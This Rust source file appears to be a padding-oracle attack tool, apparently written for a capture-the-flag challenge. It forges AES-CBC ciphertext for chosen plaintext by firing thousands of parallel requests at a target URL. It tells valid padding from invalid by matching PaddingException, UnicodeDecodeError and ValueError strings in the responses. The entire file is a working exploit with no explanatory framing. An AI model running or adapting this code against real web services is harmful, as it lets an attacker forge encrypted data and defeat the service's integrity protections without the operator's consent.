use std::time::Duration;

use crate::shared::*;
use anyhow::Result;
use base64::prelude::*;
use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use parking_lot::Mutex;
use rayon::prelude::*;
use reqwest::blocking::Client;

pub fn encrypt(url: String, plaintext: &str) -> Result<()> {
    let client = Client::new();

    let mut plaintext = plaintext.as_bytes().to_vec();
    let padding = 16 - (plaintext.len() % CHUNK_SIZE);

    plaintext.extend((0..padding).map(|_| padding as u8));
    let ciphertext: Mutex<Vec<[u8; 16]>> = Mutex::new(vec![[0u8; 16]]);

    rayon::ThreadPoolBuilder::new()
        .num_threads(64)
        .build()
        .unwrap()
        .install(|| {
            let mb = MultiProgress::new();
            let pb1 = mb.add(ProgressBar::new(
                ((plaintext.len() / CHUNK_SIZE) * 16) as u64,
            ));
            pb1.set_style(
                ProgressStyle::with_template("{wide_bar} {pos}/{len} {per_sec} {eta_precise}")
                    .unwrap(),
            );
            plaintext
                .chunks_exact(CHUNK_SIZE)
                .rev()
                .enumerate()
                .for_each(|(n, chunk)| {
                    let spinner = mb.insert_before(&pb1, ProgressBar::new_spinner());
                    spinner.enable_steady_tick(Duration::from_millis(100));
                    let mut cipherblocks: [u8; 32] =
                        [[0u8; 16], *ciphertext.lock().last().unwrap()]
                            .concat()
                            .try_into()
                            .unwrap();

                    let mut intermediate = [0u8; 16];
                    for byte in 1..=CHUNK_SIZE {
                        if let Some(value) = (0u8..255).into_par_iter().find_any(|&value| {
                            let mut cipherblocks = cipherblocks;
                            cipherblocks[16 - byte] = value;

                            let encoded = BASE64_STANDARD.encode(cipherblocks).fuckup_base64();

                            let res = client.get(&url).query(&[("post", encoded)]).send().unwrap();
                            let text = res.text().unwrap();

                            if !text.contains("PaddingException")
                                && (text.contains("UnicodeDecodeError")
                                    || text.contains("ValueError")
                                    || byte != 1)
                            {
                                spinner.set_message(format!(
                                    "block {}, byte {}/{}",
                                    n, byte, CHUNK_SIZE
                                ));
                                pb1.inc(1);
                                return true;
                            }
                            false
                        }) {
                            intermediate[16 - byte] = value ^ byte as u8;
                            cipherblocks[16 - byte] = value;
                            for x in 1..=byte {
                                cipherblocks[16 - x] = intermediate[16 - x] ^ (byte as u8 + 1);
                            }
                        }
                    }
                    let encoded_plaintext: [u8; 16] = intermediate
                        .iter()
                        .zip(chunk.iter())
                        .map(|(&x, &y)| x ^ y)
                        .collect::<Vec<u8>>()
                        .try_into()
                        .unwrap();
                    ciphertext.lock().push(encoded_plaintext);
                    spinner.finish_with_message(format!("block {n} finished."));
                });
            let mut guard = ciphertext.lock();
            guard.reverse();
            let encoded_ciphertext = BASE64_STANDARD.encode(guard.concat()).fuckup_base64();
            drop(guard);
            let res = client
                .get(&url)
                .query(&[("post", encoded_ciphertext)])
                .send()
                .unwrap();
            let text = res.text().unwrap();
            println!("{text}");
        });

    Ok(())
}
